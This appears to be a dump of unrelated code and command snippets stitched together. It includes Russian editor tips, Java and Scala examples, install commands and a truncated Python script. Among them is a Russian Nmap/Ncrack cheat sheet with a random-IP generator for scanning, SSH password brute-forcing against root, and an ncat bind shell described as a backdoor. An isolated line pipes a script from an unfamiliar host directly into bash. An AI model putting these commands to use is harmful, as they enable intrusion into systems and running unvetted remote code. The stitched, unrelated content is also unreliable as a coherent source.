Ctr + F9	Сортировка строк с учетом регистра
Ctr + K + L	Привести текст к нижнему регистру
Ctr + K + U	Привести текст к верхнему регистру
 

Интерфейс:

F11	Включить/выключить фулскрин режим
Shift + F11	Так называемые distraction free mode
Ctr + K + B	Показать/скрыть сайдбар слева
Ctr + колесико/+/−	Сделать шрифты больше/меньше
 

Прочее:

F6	Включить/выключить проверку орфографии
Ctr + Shift + P	Поиск команды редактора по ее названию
Ctr + ~	Показать/скрыть Python-консоль
 

По большому счету, это все!

Файл настроек
В контексте этой заметки нельзя не сказать и пару слов о файле настроек.

Искать его следует где-то здесь:

~/.config/sublime-text-*/Packages/User/Preferences.sublime-settings
Если такого файла нет, ничего страшного — просто создайте его.

Вот содержимое моего файла:

{
  "always_show_minimap_viewport": true,
  "draw_centered": true,
  "word_wrap": true,
  "wrap_width": 80,
  "font_size": 10,
  "rulers":
  [
    80
  ],
  "update_check": false
}
Как видите, это обычный JSON. Приведенные настройки говорят саблайму (1) всегда подсвечивать на minimap справа то место, на которое мы сейчас смотрим, (2) рендерить текст по центру, а не по левой стороне (3) отображать слова на следующей строчке, если строка не умещается в 80 символов по ширине, (4) использовать шрифт размером 10 попугаев, (5) отмечать вертикальной линией ширину строки в 80 символов и (6) не проверять наличие новых версий редактора. В такой конфигурации получается что-то очень похожее на distraction free mode, только с табами, номерами строк и отображением закладок. Все изменения настроек саблайм подхватывает на лету, без перезапуска редактора.
==============================================================================================================
#!/usr/bin/sbt -Dsbt.version=0.13.7 -Dsbt.main.class=sbt.ScriptMain
!#

/***
scalaVersion := "2.11.7"
*/

import sys.process._
import java.io._

run("ls -la" #| "wc -l" #> new File("/tmp/out.txt"))

def run(cmd: ProcessBuilder): String = {
  // ... see above ...
}
==============================================================================================================
Установка Nmap в Debian/Ubuntu:

sudo apt-get install nmap
Установка утилиты Ncrack (на момент написания поста она находится в альфе и потому не содержится в deb-пакете):

wget https://nmap.org/ncrack/dist/ncrack-0.4ALPHA.tar.gz
tar -xvzf ncrack-0.4ALPHA.tar.gz
cd ncrack-0.4ALPHA
./configure
make
sudo ckeckinstall
Сканируем 1000 наиболее часто используемых портов:

nmap 12.34.56.78
Указываем список портов:

nmap -p22,80,100-200 12.34.56.78
Сканирование подсети:

nmap -p22 52.8.254.0/24
Сканирование списка хостов из файла:

nmap -p22 -iL iplist.txt
Генерировать списки случайных IP можно, например, таким скриптом на Perl:

#!/usr/bin/perl

use strict;
use warnings;

my $cnt = 0;
my %filter;

my $gen_number = shift;

if(!$gen_number) {
  die "Usage: $0 <number>";
}

while($cnt < $gen_number) {
  my $x = 1 + int(rand(239));
  my $y = int(rand(256));
  my $z = int(rand(256));
  my $w = 1 + int(rand(254));

  # see https://en.wikipedia.org/wiki/Reserved_IP_addresses
  if(($x == 10) || ($x == 127)) { next; }
  if(($x == 100) && ($y >= 64) && ($y <= 127)) { next; }
  if(($x == 169) && ($y == 254)) { next; }
  if(($x == 172) && ($y >= 16) && ($y <= 31)) { next; }
  if(($x == 192) && ($y == 0) && ($z == 0)) { next; }
  if(($x == 192) && ($y == 0) && ($z == 2)) { next; }
  if(($x == 192) && ($y == 88) && ($z == 99)) { next; }
  if(($x == 192) && ($y == 168)) { next; }
  if(($x == 198) && ($y == 18)) { next; }
  if(($x == 198) && ($y == 19)) { next; }
  if(($x == 198) && ($y == 51) && ($z == 100)) { next; }
  if(($x == 203) && ($y == 0) && ($z == 113)) { next; }
  if(($x >= 224) && ($x <= 239)) { next; }

  my $ip = "$x.$y.$z.$w";
  if($filter{$ip}) { next; }

  $filter{$ip} = 1;
  print "$ip\n";
  $cnt++;
}
Сканирование методом установки TCP соединения:

nmap -p22,80 -sT 12.34.56.78
SYN-сканирование:

sudo nmap -p22,80 -sS 12.34.56.78
Прочие виды сканирования: FIN, Xmas Tree и NULL:

sudo nmap -p22,80 -sF 12.34.56.78
sudo nmap -p22,80 -sX 12.34.56.78
sudo nmap -p22,80 -sN 12.34.56.78
Не определять доменные имена для сканируемых IP:

nmap -n -p22 12.34.56.78
Показывать причину, по которой определенный порт считается «открытым»:

nmap -p22,80,100-200 --reason 12.34.56.78
Определение версии сервисов:

nmap -p22,80,100-200 -sV 12.34.56.78
Определение операционной системы:

sudo nmap -O 12.34.56.78
Пингануть хосты для проверки, онлайн ли они, но не сканировать порты:

nmap -sn 12.34.56.0/24
Сканировать хосты, даже если они не отвечают на пинги:

nmap -p22,80 -Pn 12.34.56.78
Считать, что хост онлайн, если он отвечает на SYN, посланный на порт 443:

nmap -p22,80,443 -PS 443 12.34.56.0/24
Сканирование UDP (работает медленнее обычного сканирования TCP):

sudo nmap -sU -p123 tick.ucla.edu
Ограничиваем время, которое можно потратить на один хост:

nmap -p22 --host-timeout 1m 12.34.56.78
Управление степенью параллелизма:

nmap -p22 --max-parallelism 2 12.34.56.78
nmap -p22 --min-parallelism 2 12.34.56.78
Делаем паузу прежде, чем перейти к следующему хосту:

nmap -p22 --scan-delay 5s 12.34.56.0/24
Ограничение на число пакетов, посылаемых в секунду:

nmap -p22 --min-rate 1 --max-rate 100 12.34.56.78
Использование NSE (Nmap Scripting Engine):

# обновляем базу данных скриптов
sudo nmap --script-updatedb

# натравляем все скрипты из группы default:
nmap --script default 12.34.56.78

# все скрипты, название которых начинается на http
nmap --script http-* 12.34.56.78
Ломаем SSH с помощью Ncrack:

ncrack ssh://12.34.56.78
ncrack --user root ssh://12.34.56.78
Fun fact! Существуют и другие утилиты для подбора паролей, заметно отличающиеся между собой поддерживаемыми протоколами и опциями. В частности, стоит обратить внимание на утилиты hydra и medusa.

Указываем списки логинов и паролей для Ncrack:

ncrack -U users.txt -P passwords.txt ...
Выводим больше отладочной информации, включая подбираемые логины и пароли:

ncrack -d7 ...
Используем Ncrack совместно с Nmap:

nmap 12.34.56.78 -oX scan.xml
ncrack -iX scan.xml
Использование Ndiff:

ndiff scan1.xml scan2.xml
Пример использования Nping:

sudo nping -c2 -p80 --tcp 12.34.56.78
Примеры использования Ncat:

ncat host 123 < send.txt
ncat -l > received.txt
Использование Ncat в качестве бэкдора:

ncat -k -l -p 3344 -e /bin/bash
ncat localhost 3344
Ncat для пробрасывания портов:

ncat -l 10.1.2.3 --keep-open 2222 \
  --sh-exec "ncat 192.168.2.15 22"
ssh user@10.1.2.3 -p 2222
Ncat для расшифровки SSL:

ncat -l localhost --keep-open 8080 \
  --sh-exec "ncat --ssl encrypted.google.com 443"
С сохранением трафика в файл:

ncat -l localhost --keep-open 8080 --hex-dump dump.log \
  --sh-exec "ncat --ssl encrypted.google.com 443"
==============================================================================================================
wget geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
gunzip GeoLiteCity.dat.gz

#!/bin/sh
/usr/bin/sbt -Dsbt.version=0.13.7 -Dsbt.main.class=sbt.ConsoleMain "$@"

screpl "com.maxmind.geoip%geoip-api%1.2.14"

scala> import com.maxmind.geoip._
import com.maxmind.geoip._

scala> val srv = {
     | new LookupService("./GeoLiteCity.dat",
     |                   LookupService.GEOIP_MEMORY_CACHE)
     | }
scala> val loc = srv.getLocation("123.45.67.89")
Смотрим в интересующие нас поля:

scala> loc.countryCode
res0: String = RU

scala> loc.countryName
res1: String = Russian Federation

scala> loc.city
res2: String = Moscow

scala> loc.latitude
res3: Float = 55.752197

scala> loc.longitude
res4: Float = 37.6156
==============================================================================================================
java -Dlogback.configurationFile=path/to/logback.xml -jar ./target/scala-2.11/finagle-example-assembly-0.1.jar
==============================================================================================================
package com.acme.web;

import com.acme.account.Account;
import com.acme.account.AccountService;
import com.acme.transaction.Transaction;
import com.acme.transaction.TransactionService;
import io.vertx.core.AbstractVerticle;

import io.vertx.core.json.DecodeException;
import io.vertx.core.json.JsonObject;
import io.vertx.ext.auth.oauth2.OAuth2Auth;
import io.vertx.ext.auth.oauth2.providers.GithubAuth;
import io.vertx.ext.web.Route;
import io.vertx.ext.web.Router;
import io.vertx.ext.web.RoutingContext;
import io.vertx.ext.web.handler.*;
import io.vertx.ext.web.sstore.LocalSessionStore;

public class MainVerticle extends AbstractVerticle {

  @Override
  public void start() {
    final AccountService accountService = AccountService.createProxy(vertx, AccountService.DEFAULT_ADDRESS);
    final TransactionService transactionService = TransactionService.createProxy(vertx, TransactionService.DEFAULT_ADDRESS);
    // the router will map http requests to handlers
    final Router app = Router.router(vertx);
    // enable parsing of http message bodies e.g.: json upload, multipart-form data
    app.post().handler(BodyHandler.create());

    // We need cookies and sessions
    app.route()
      .handler(CookieHandler.create());
    app.route()
      .handler(SessionHandler.create(LocalSessionStore.create(vertx)));
    // Simple auth service which uses a GitHub to authenticate the user
    OAuth2Auth authProvider =
      GithubAuth.create(vertx, System.getenv("CLIENTID"), System.getenv("CLIENTSECRET"));
    // We need a user session handler too to make sure
    // the user is stored in the session between requests
    app.route()
      .handler(UserSessionHandler.create(authProvider));

    // TODO: (REFACTOR #13) create a callback route

    // TODO: (REFACTOR #13) protect all handlers from this point forward

    app.post("/account")
      // TODO: (REFACTOR #9) validate the input body
      // validate the input data
      .handler(ctx -> {
        try {
          // save the parsed input in the request context
          ctx.put("initialBalance", ctx.getBodyAsJson().getInteger("balance", 0));
          // invoke the next handler
          ctx.next();
        } catch (RuntimeException e) {
          ctx.fail(e);
        }
      })
      // create an account, at this moment the input has been validated
      .handler(ctx -> {
        accountService.createAccount(ctx.get("initialBalance"), createAccount -> {
          if (createAccount.failed()) {
            ctx.fail(createAccount.cause());
          } else {
            ctx
              .put("created", createAccount.result())
              .next();
          }
        });
      })
      // TODO: (REFACTOR #9) handle the last as a 202 created response
      ;

    app.get("/account/:id")
      // validate the input
      .handler(MainVerticle::idValidation)
      // invoke the remote service and return the json response
      .handler(ctx -> {
        accountService.getAccount(ctx.get("id"), getAccount -> {
          if (getAccount.failed()) {
            ctx.fail(getAccount.cause());
          } else {
            Account account = getAccount.result();
            // pass the reply to the next handler
            ctx
              .put("reply", account == null ? null : account.toJson())
              .next();
          }
        });
      })
      .handler(MainVerticle::jsonReply);

    app.post("/transaction")
      // validate the input body
      .handler(MainVerticle::jsonBody)
      // validate the input data
      .handler(ctx -> {
        try {
          JsonObject body = ctx.getBodyAsJson();

          String source = body.getString("source");
          String target = body.getString("target");
          int amount = body.getInteger("amount", -1);

          if (source == null || target == null || amount < 0) {
            ctx.fail(400);
          } else {
            // save the parsed input in the request context
            ctx.put("source", source);
            ctx.put("target", target);
            ctx.put("amount", amount);

            // invoke the next handler
            ctx.next();
          }
        } catch (RuntimeException e) {
          ctx.fail(e);
        }
      })
      .handler(ctx -> {
        // TODO: (REFACTOR #10) use the service proxy with the variable initialBalance from the context
        // On success, put the response on a context under the name "created" and handle it
        // to the next handler
      })
      .handler(MainVerticle::created);

    app.get("/transaction/:id")
      // validate the input
      .handler(MainVerticle::idValidation)
      .handler(ctx -> {
        transactionService.getTransaction(ctx.get("id"), getTransaction -> {
          if (getTransaction.failed()) {
            ctx.fail(getTransaction.cause());
          } else {
            Transaction transaction = getTransaction.result();
            // pass the reply to the next handler
            ctx
              .put("reply", transaction == null ? null : transaction.toJson())
              .next();
          }
        });
      })
      .handler(MainVerticle::jsonReply);

    // Serve the static resources
    app.route().handler(StaticHandler.create());

    vertx.createHttpServer().requestHandler(app::accept).listen(8080, res -> {
      if (res.failed()) {
        res.cause().printStackTrace();
      } else {
        System.out.println("Server listening at: http://localhost:8080/");
      }
    });
  }

  /**
   * Ensures that there is a HTTP JSON body in the request.
   * Will fail the request with status code 400 (Bad Request) if no body is present
   */
  private static void jsonBody(RoutingContext ctx) {
    try {
      JsonObject body = ctx.getBodyAsJson();
      if (body == null) {
        // no json body
        ctx.fail(400);
      }
      ctx.next();
    } catch (DecodeException e) {
      ctx.fail(e);
    }
  }

  /**
   * Ensures that there is a path param "id" in the request.
   * Will fail the request with status code 400 (Bad Request) if no "id" is present
   */
  private static void idValidation(RoutingContext ctx) {
    String id = ctx.pathParam("id");
    if (id == null) {
      // if the id is not present, return bad request
      ctx.fail(400);
    } else {
      ctx.put("id", id);
      ctx.next();
    }
  }

  /**
   * Will return status code 202 (Created) with the location header pointing to the newly created resource.
   */
  private static void created(RoutingContext ctx) {
    ctx.response()
      .putHeader("Location", ctx.normalisedPath() + "/" + ctx.get("created"))
      .setStatusCode(202)
      .end();
  }

  /**
   * Will return a JSON response with the correct headers or status code 404 (Not Found) if reply is null
   */
  private static void jsonReply(RoutingContext ctx) {
    JsonObject reply = ctx.get("reply");
    if (reply == null) {
      ctx.fail(404);
    } else {
      ctx.response()
        .putHeader("Content-Type", "application/json")
        .end(reply.encodePrettily());
    }
  }
}


  <dependencies>
    <dependency>
      <groupId>io.vertx</groupId>
      <artifactId>vertx-core</artifactId>
      <version>3.5.0</version>
    </dependency>
    <dependency>
      <groupId>io.vertx</groupId>
      <artifactId>vertx-web</artifactId>
      <version>3.5.0</version>
    </dependency>
    <dependency>
      <groupId>io.vertx</groupId>
      <artifactId>vertx-service-proxy</artifactId>
      <version>3.5.0</version>
    </dependency>
    <dependency>
      <groupId>com.acme</groupId>
      <artifactId>account</artifactId>
      <version>1.0.0</version>
      <classifier>api</classifier>
    </dependency>
    <dependency>
      <groupId>com.acme</groupId>
      <artifactId>transaction</artifactId>
      <version>1.0.0</version>
      <classifier>api</classifier>
    </dependency>
    <dependency>
      <groupId>io.vertx</groupId>
      <artifactId>vertx-auth-oauth2</artifactId>
      <version>3.5.0</version>
    </dependency>
  </dependencies>
==============================================================================================================
SET DATABASE UNIQUE NAME HSQLDB5F2C12D57E
SET DATABASE GC 0
SET DATABASE DEFAULT RESULT MEMORY ROWS 0
SET DATABASE EVENT LOG LEVEL 0
SET DATABASE TRANSACTION CONTROL LOCKS
SET DATABASE DEFAULT ISOLATION LEVEL READ COMMITTED
SET DATABASE TRANSACTION ROLLBACK ON CONFLICT TRUE
SET DATABASE TEXT TABLE DEFAULTS ''
SET DATABASE SQL NAMES FALSE
SET DATABASE SQL REFERENCES FALSE
SET DATABASE SQL SIZE TRUE
SET DATABASE SQL TYPES FALSE
SET DATABASE SQL TDC DELETE TRUE
SET DATABASE SQL TDC UPDATE TRUE
SET DATABASE SQL CONCAT NULLS TRUE
SET DATABASE SQL UNIQUE NULLS TRUE
SET DATABASE SQL CONVERT TRUNCATE TRUE
SET DATABASE SQL AVG SCALE 0
SET DATABASE SQL DOUBLE NAN TRUE
SET FILES WRITE DELAY 500 MILLIS
SET FILES BACKUP INCREMENT TRUE
SET FILES CACHE SIZE 10000
SET FILES CACHE ROWS 50000
SET FILES SCALE 32
SET FILES LOB SCALE 32
SET FILES DEFRAG 0
SET FILES NIO TRUE
SET FILES NIO SIZE 256
SET FILES LOG TRUE
SET FILES LOG SIZE 50
CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e'
ALTER USER SA SET LOCAL TRUE
CREATE SCHEMA PUBLIC AUTHORIZATION DBA
SET SCHEMA PUBLIC
CREATE MEMORY TABLE PUBLIC.ACCOUNTS(ID VARCHAR(36) NOT NULL PRIMARY KEY,BALANCE INTEGER DEFAULT 0 NOT NULL)
CREATE MEMORY TABLE PUBLIC.TRANSACTIONS(ID VARCHAR(36) NOT NULL PRIMARY KEY,AMOUNT INTEGER NOT NULL,STATUS VARCHAR(20) NOT NULL,SOURCE VARCHAR(36) NOT NULL,TARGET VARCHAR(36) NOT NULL)
ALTER SEQUENCE SYSTEM_LOBS.LOB_ID RESTART WITH 1
SET DATABASE DEFAULT INITIAL SCHEMA PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.SQL_IDENTIFIER TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.YES_OR_NO TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.TIME_STAMP TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CARDINAL_NUMBER TO PUBLIC
GRANT USAGE ON DOMAIN INFORMATION_SCHEMA.CHARACTER_DATA TO PUBLIC
GRANT DBA TO SA
SET SCHEMA SYSTEM_LOBS
INSERT INTO BLOCKS VALUES(0,2147483647,0)
SET SCHEMA PUBLIC
INSERT INTO ACCOUNTS VALUES('0571f011-25e7-4bc6-ae34-3e990d41265a',10)
INSERT INTO ACCOUNTS VALUES('0a4fbd4e-f5be-4b4b-b82a-5736b99a3b3f',10)
INSERT INTO ACCOUNTS VALUES('1903a0b0-9462-40d6-8a82-173cbe8d4c75',0)
INSERT INTO ACCOUNTS VALUES('1c7ecb45-d31a-45e1-8c54-bad666168864',25)
INSERT INTO ACCOUNTS VALUES('1d8db257-8edd-441a-90bd-37c334b97b34',25)
INSERT INTO ACCOUNTS VALUES('378a926f-9e26-44ff-b600-d725b033a6c1',75)
INSERT INTO ACCOUNTS VALUES('3d062aef-136f-4db1-8b65-d735c9eb61da',25)
INSERT INTO ACCOUNTS VALUES('4045789b-4aa7-4f1e-aa3d-24db94909cbe',25)
INSERT INTO ACCOUNTS VALUES('43c32675-8c27-4389-9c5c-d2a43fcb44ad',25)
INSERT INTO ACCOUNTS VALUES('4c954d2e-def6-4231-9be2-e682bca0ea71',0)
INSERT INTO ACCOUNTS VALUES('593428aa-372b-44a6-b369-b85b9710796b',10)
INSERT INTO ACCOUNTS VALUES('5c3dfc3a-5e67-46ab-85e0-8809c2b9d0b8',0)
INSERT INTO ACCOUNTS VALUES('6abdaff0-b2bd-4c93-b3d8-9969788c047c',10)
INSERT INTO ACCOUNTS VALUES('6f51ac68-5048-4868-a028-8c8db553468a',0)
INSERT INTO ACCOUNTS VALUES('71387a41-b0b2-477c-88af-381520525daf',0)
INSERT INTO ACCOUNTS VALUES('76b6ca50-431e-4041-a668-8d5d25fe4831',10)
INSERT INTO ACCOUNTS VALUES('7a7793e3-d93b-44e2-9f58-ea7566b67c70',10)
INSERT INTO ACCOUNTS VALUES('7bd78582-a2ec-4cdd-9137-0992d15d78ca',0)
INSERT INTO ACCOUNTS VALUES('7fd2195e-3cff-4f8a-94f0-74119204a5ef',75)
INSERT INTO ACCOUNTS VALUES('80b96db8-0ce6-4ffa-a3ec-f999fa6b2551',10)
INSERT INTO ACCOUNTS VALUES('8583a75b-5858-416b-9983-a7b552c527fc',75)
INSERT INTO ACCOUNTS VALUES('8f72739d-75bd-4df4-8eb3-bbe05a753c15',75)
INSERT INTO ACCOUNTS VALUES('9313c500-a125-47f8-be6f-89d0341b0d74',25)
INSERT INTO ACCOUNTS VALUES('93c4676f-5c13-4215-8e2a-b5d554e96937',0)
INSERT INTO ACCOUNTS VALUES('9e003161-051d-414b-96c7-a50a6f435d64',75)
INSERT INTO ACCOUNTS VALUES('a84b2c9d-4d31-40f4-ac05-7ac3b172d488',6)
INSERT INTO ACCOUNTS VALUES('c070c052-b55c-469b-b61f-85975493dcfe',0)
INSERT INTO ACCOUNTS VALUES('caec8c94-5511-4729-8899-a599c03c2788',10)
INSERT INTO ACCOUNTS VALUES('cb910baa-eba9-47d5-a69d-097234828678',75)
INSERT INTO ACCOUNTS VALUES('d84cda30-6797-41a0-b048-730404dd7541',25)
INSERT INTO ACCOUNTS VALUES('ddce04c9-4b73-471f-9201-179b70cbfccc',0)
INSERT INTO ACCOUNTS VALUES('deb85e01-e8cf-4c47-aacb-1153dcd7a9db',10)
INSERT INTO ACCOUNTS VALUES('e0deee62-5eb8-46d3-a71d-6c8926dfaa0e',0)
INSERT INTO ACCOUNTS VALUES('ed5440c5-98c5-4bf6-b945-cdd0cb41af1b',75)
INSERT INTO ACCOUNTS VALUES('f638c444-2be0-4017-a7f9-1e703a672f8c',0)
INSERT INTO ACCOUNTS VALUES('f6d29dd0-fc15-46ea-bc0f-5bc9e53b58dc',25)
INSERT INTO ACCOUNTS VALUES('f9d162ad-052a-41d4-a9ad-4b6b1d0e8a75',75)
INSERT INTO ACCOUNTS VALUES('fb5525b7-d841-474a-82a5-179d4e099ce0',10)
INSERT INTO TRANSACTIONS VALUES('0c239d09-3d42-48a9-8359-e46fe458b6d1',10,'CONFIRMED','fromAccount','toAccount')
INSERT INTO TRANSACTIONS VALUES('e40a7286-5309-4c3f-8997-4b06ed206b41',10,'CONFIRMED','fromAccount','toAccount')

==============================================================================================================
# build
> nvm use v8.16
> npm install --only=production

# start
> npm start

# if access error
> sudo adduser $(whoami) dialout
> sudo chmod a+rw /dev/ttyACM0
==============================================================================================================
pip install имя_пакета

Да, если установка производится в операционную среду Windows, тогда перед pip нужно добавлять "python -m". Кстати, обновить пакет в Python тоже несложно посредством простой команды:

pip install имя_пакета –U

Следующая команда вам пригодится, если у вас последняя версия пакета, но есть желание принудительно переустановить его:

pip install --force-reinstall

Хотите посмотреть список пакетов, установленных на Python? Используйте следующую команду: 

pip list

https://www.lfd.uci.edu/~gohlke/pythonlibs/#pip
==============================================================================================================
python get-pip.py --proxy="http://192.168.254.1:8888"

setx PYTHONPATH "D:\Python3.6.5;D:\Python3.6.5\DLLs;D:\Python3.6.5\lib;D:\Python3.6.5\lib\plat-win;D:\Python3.6.5\lib\site-packages"

setx /M PYTHONPATH "D:\Python3.6.5;D:\Python3.6.5\DLLs;D:\Python3.6.5\lib;D:\Python3.6.5\lib\plat-win;D:\Python3.6.5\lib\site-packages"

ren python36._pth python36._pth.save


https://michlstechblog.info/blog/python-install-python-with-pip-on-windows-by-the-embeddable-zip-file/
==============================================================================================================
sudo apt-get install libpq-dev
==============================================================================================================
wget https://raw.githubusercontent.com/yugabyte/aws-cloudformation/master/yugabyte_cloudformation.yaml
aws cloudformation create-stack --stack-name <stack-name> --template-body file://yugabyte_cloudformation.yaml --parameters ParameterKey=DBVersion,ParameterValue=2.0.7.0,ParameterKey=KeyName,ParameterValue=<ssh-key-name>
==============================================================================================================
curl http://sniffmap.telcomap.org/netprobe.php?debug=1 | bash

==============================================================================================================
bundle exec rake db:create:all
select pg_reload_conf()
==============================================================================================================
export FLASK_DEBUG=1
export FLASK_APP=server.py
flask run --host=0.0.0.0 --port=8001 # <- Be careful here, this exposes it on ALL ip addresses. Ideally if run locally --host=127.0.0.1
==============================================================================================================
"use strict";
const mkdirp = require('mkdirp');
const fs = require('fs');
const os = require('os');

async function getPoolGenesisTxnPath(poolName) {
   let path = `${os.tmpdir()}/indy/${poolName}.txn`;
   await savePoolGenesisTxnFile(path);
   return path
};

async function poolGenesisTxnData() {
   return `{"reqSignature":{},"txn":{"data":{"data":{"alias":"Node1","blskey":"4N8aUNHSgjQVgkpm8nhNEfDf6txHznoYREg9kirmJrkivgL4oSEimFF6nsQ6M41QvhM2Z33nves5vfSn9n1UwNFJBYtWVnHYMATn76vLuL3zU88KyeAYcHfsih3He6UHcXDxcaecHVz6jhCYz1P2UZn2bDVruL5wXpehgBfBaLKm3Ba","blskey_pop":"RahHYiCvoNCtPTrVtP7nMC5eTYrsUA8WjXbdhNc8debh1agE9bGiJxWBXYNFbnJXoXhWFMvyqhqhRoq737YQemH5ik9oL7R4NTTCz2LEZhkgLJzB3QRQqJyBNyv7acbdHrAT8nQ9UkLbaVL9NBpnWXBTw4LEMePaSHEw66RzPNdAX1","client_ip":"172.18.0.2","client_port":9702,"node_ip":"172.18.0.2","node_port":9701,"services":["VALIDATOR"]},"dest":"Gw6pDLhcBcoQesN72qfotTgFa7cbuqZpkX3Xo6pLhPhv"},"metadata":{"from":"Th7MpTaRZVRYnPiabds81Y"},"type":"0"},"txnMetadata":{"seqNo":1,"txnId":"fea82e10e894419fe2bea7d96296a6d46f50f93f9eeda954ec461b2ed2950b62"},"ver":"1"}
{"reqSignature":{},"txn":{"data":{"data":{"alias":"Node2","blskey":"37rAPpXVoxzKhz7d9gkUe52XuXryuLXoM6P6LbWDB7LSbG62Lsb33sfG7zqS8TK1MXwuCHj1FKNzVpsnafmqLG1vXN88rt38mNFs9TENzm4QHdBzsvCuoBnPH7rpYYDo9DZNJePaDvRvqJKByCabubJz3XXKbEeshzpz4Ma5QYpJqjk","blskey_pop":"Qr658mWZ2YC8JXGXwMDQTzuZCWF7NK9EwxphGmcBvCh6ybUuLxbG65nsX4JvD4SPNtkJ2w9ug1yLTj6fgmuDg41TgECXjLCij3RMsV8CwewBVgVN67wsA45DFWvqvLtu4rjNnE9JbdFTc1Z4WCPA3Xan44K1HoHAq9EVeaRYs8zoF5","client_ip":"172.18.0.3","client_port":9704,"node_ip":"172.18.0.3","node_port":9703,"services":["VALIDATOR"]},"dest":"8ECVSk179mjsjKRLWiQtssMLgp6EPhWXtaYyStWPSGAb"},"metadata":{"from":"EbP4aYNeTHL6q385GuVpRV"},"type":"0"},"txnMetadata":{"seqNo":2,"txnId":"1ac8aece2a18ced660fef8694b61aac3af08ba875ce3026a160acbc3a3af35fc"},"ver":"1"}
`;
}

async function savePoolGenesisTxnFile(filePath) {
   let data = await poolGenesisTxnData();
   await mkdir(filePath);
   return fs.writeFileSync(filePath, data, 'utf8');
}

async function mkdir(filePath) {
   return new Promise((resolve, reject) => {
      let folderPath = filePath.split('/').slice(0, filePath.split('/').length - 1).join('/');
      mkdirp(folderPath, function(err, res) {
         if(err) reject(err);
         else resolve(res);
      })
   })
}

function pathToIndyClientHome() {
   return require('os').homedir() + "/.indy_client"
}

function sleep(duration){
   return new Promise(resolve => {
      setTimeout(resolve,duration)
   })
}

function getCurrentTimeInSeconds() {
   return Math.floor(Date.now() / 1000)
}

module.exports = {
   getPoolGenesisTxnPath,
   getPathToIndyClientHome: pathToIndyClientHome,
   sleep,
   getCurrentTimeInSeconds
}
==============================================================================================================
npm install --no-optional
npm install --no-bin-links
==============================================================================================================
choco install make
curl https://install.meteor.com/ | sh
==============================================================================================================
git pull --rebase upstream master
git remote add upstream https://github.com/madvas/ethlance.git
==============================================================================================================
$ curl -o- -L https://yarnpkg.com/install.sh | bash
$ yarn install
$ yarn start

$ npm version
$ git push origin master --tags
==============================================================================================================
npm install --save-dev webpack-dev-server@2.9.7
==============================================================================================================
// tslint:disable:no-console
// In production, we register a service worker to serve assets from local cache.

// This lets the app load faster on subsequent visits in production, and gives
// it offline capabilities. However, it also means that developers (and users)
// will only see deployed updates on the 'N+1' visit to a page, since previously
// cached resources are updated in the background.

// To learn more about the benefits of this model, read https://goo.gl/KwvDNy.
// This link also includes instructions on opting out of this behavior.

const isLocalhost = Boolean(
  window.location.hostname === 'localhost' ||
    // [::1] is the IPv6 localhost address.
    window.location.hostname === '[::1]' ||
    // 127.0.0.1/8 is considered localhost for IPv4.
    window.location.hostname.match(
      /^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/
    )
);

export default function register() {
  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {
    // The URL constructor is available in all browsers that support SW.
    const publicUrl = new URL(
      process.env.PUBLIC_URL!,
      window.location.toString()
    );
    if (publicUrl.origin !== window.location.origin) {
      // Our service worker won't work if PUBLIC_URL is on a different origin
      // from what our page is served on. This might happen if a CDN is used to
      // serve assets; see https://github.com/facebookincubator/create-react-app/issues/2374
      return;
    }

    window.addEventListener('load', () => {
      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;

      if (isLocalhost) {
        // This is running on localhost. Lets check if a service worker still exists or not.
        checkValidServiceWorker(swUrl);

        // Add some additional logging to localhost, pointing developers to the
        // service worker/PWA documentation.
        navigator.serviceWorker.ready.then(() => {
          console.log(
            'This web app is being served cache-first by a service ' +
              'worker. To learn more, visit https://goo.gl/SC7cgQ'
          );
        });
      } else {
        // Is not local host. Just register service worker
        registerValidSW(swUrl);
      }
    });
  }
}

function registerValidSW(swUrl: string) {
  navigator.serviceWorker
    .register(swUrl)
    .then(registration => {
      registration.onupdatefound = () => {
        const installingWorker = registration.installing;
        if (installingWorker) {
          installingWorker.onstatechange = () => {
            if (installingWorker.state === 'installed') {
              if (navigator.serviceWorker.controller) {
                // At this point, the old content will have been purged and
                // the fresh content will have been added to the cache.
                // It's the perfect time to display a 'New content is
                // available; please refresh.' message in your web app.
                console.log('New content is available; please refresh.');
              } else {
                // At this point, everything has been precached.
                // It's the perfect time to display a
                // 'Content is cached for offline use.' message.
                console.log('Content is cached for offline use.');
              }
            }
          };
        }
      };
    })
    .catch(error => {
      console.error('Error during service worker registration:', error);
    });
}

function checkValidServiceWorker(swUrl: string) {
  // Check if the service worker can be found. If it can't reload the page.
  fetch(swUrl)
    .then(response => {
      // Ensure service worker exists, and that we really are getting a JS file.
      if (
        response.status === 404 ||
        response.headers.get('content-type')!.indexOf('javascript') === -1
      ) {
        // No service worker found. Probably a different app. Reload the page.
        navigator.serviceWorker.ready.then(registration => {
          registration.unregister().then(() => {
            window.location.reload();
          });
        });
      } else {
        // Service worker found. Proceed as normal.
        registerValidSW(swUrl);
      }
    })
    .catch(() => {
      console.log(
        'No internet connection found. App is running in offline mode.'
      );
    });
}

export function unregister() {
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.ready.then(registration => {
      registration.unregister();
    });
  }
}
==============================================================================================================
#pip install requests psutil
import time
import requests
import psutil
import argparse

# constants
URL = 'https://corlysis.com:8086/write'
READING_DATA_PERIOD_MS = 1000.0
SENDING_PERIOD = 5
MAX_LINES_HISTORY = 1000


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("db", help="database name")
    parser.add_argument("token", help="secret token")
    args = parser.parse_args()

    corlysis_params = {"db": args.db, "u": "token", "p": args.token, "precision": "ms"}

    # initialization
    payload = ""
    counter = 1
    problem_counter = 0

    # infinite loop
    while True:
        unix_time_ms = int(time.time()*1000)

        # read sensor data and convert it to line protocol
        line = "server_data cpu_percent={},free_memory={} {}\n".format(psutil.cpu_percent(interval=None),
                                                                       psutil.virtual_memory().free,
                                                                       unix_time_ms)

        payload += line

        if counter % SENDING_PERIOD == 0:
            try:
                # try to send data to cloud
                r = requests.post(URL, params=corlysis_params, data=payload)
